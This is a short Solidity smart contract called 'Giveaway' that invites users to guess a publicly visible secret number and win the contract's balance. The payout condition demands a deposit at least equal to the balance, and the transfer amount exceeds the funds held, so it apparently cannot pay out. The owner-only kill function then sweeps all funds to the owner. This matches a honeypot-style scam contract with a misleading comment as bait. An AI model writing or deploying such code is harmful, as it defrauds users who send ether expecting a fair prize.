1 pragma solidity ^0.4.21;
2 contract Giveaway {
3 
4     address private owner = msg.sender;
5     uint public SecretNumber = 24;
6    
7     function() public payable {
8     }
9    
10     function Guess(uint n) public payable {
11         if(msg.value >= this.balance && n == SecretNumber && msg.value >= 0.07 ether) {
12             // Previous Guesses makes the number easier to guess so you have to pay more
13             msg.sender.transfer(this.balance + msg.value);
14         }
15     }
16     
17     function kill() public {
18         require(msg.sender == owner);
19 	    selfdestruct(msg.sender);
20 	}
21 }